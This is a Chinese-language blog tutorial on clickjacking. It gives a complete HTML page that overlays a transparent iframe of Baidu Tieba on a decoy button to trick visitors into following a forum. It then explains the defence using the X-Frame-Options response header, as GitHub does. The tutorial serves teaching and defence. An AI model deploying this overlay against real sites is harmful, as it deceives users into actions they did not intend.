# 点击劫持

## 攻击举例

```html
<!DOCTYPE HTML>
<html>
    <head>
        <title>点击劫持</title>
        <style>
            html,
            body,
            iframe {
                display: block;
                height: 100%;
                width: 100%;
                margin: 0;
                padding: 0;
                border: none;
            }

            iframe {
                opacity: 0.5; 
                /* opacity:0时点击劫持 */
                filter: alpha(opacity=0);
                position: absolute;
                z-index: 2;
            }

            button {
                position: absolute;
                top: 355px;
                left: 462px;
                z-index: 1;
                width: 72px;
                height: 26px;
            }
        </style>
    </head>

    <body>
        那些不能说的秘密
        <button>查看详情</button>
        <iframe src="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"></iframe>
    </body>
</html>
```

![](https://raw.githubusercontent.com/caistrong/Blog/master/_posts/clickjacking/tieba-clickjacking.png)
我想代码配上图已经一目了然了，所谓点击劫持就是通过iframe引入我们想要劫持的网站，将其opacity设为0，这个网站就变成透明的，然后在我们的页面设置一些诱导性的按钮，让用户去点击这个按钮，实际上用户是点击了我们劫持的网站。在我们的示例中，我们通过点击劫持为【美女吧】骗取了一个关注

## 点击劫持防范

我们打开上面的页面，按下F12然后选择Network，查看请求贴吧html页面的Response Headers
![](https://raw.githubusercontent.com/caistrong/Blog/master/_posts/clickjacking/tieba-response-headers.png)
至于为什么查看Response Headers我们这里先不谈

我们尝试把上面的iframe的src改为如下
```html
<iframe src="https://github.com/caistrong"></iframe>
```
再次刷新我们的点击劫持html页面，发现不能像劫持百度贴吧一样劫持Github，我们看到控制台的报错如下
![](https://raw.githubusercontent.com/caistrong/Blog/master/_posts/clickjacking/github-error.png)
发现我们的劫持行动失败了

我们新建标签页打开 https://github.com/caistrong 这个网址，再次查看请求html的Response Headers
![](https://raw.githubusercontent.com/caistrong/Blog/master/_posts/clickjacking/github-response-headers.jpg)

我们发现一个与贴吧的Response Headers不同的地方
```bash
X-Frame-Options: deny
```

这个响应头就是Github成功防范我们点击劫持的关键所在，参考[MDN X-Frame-Options响应头](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options)

简单讲就是在后端返回响应html页面的时候，响应头里面增加X-Frame-Options: deny或者X-Frame-Options: sameorigin，可以避免攻击者在自己的页面通过iframe嵌入我们开发的页面。
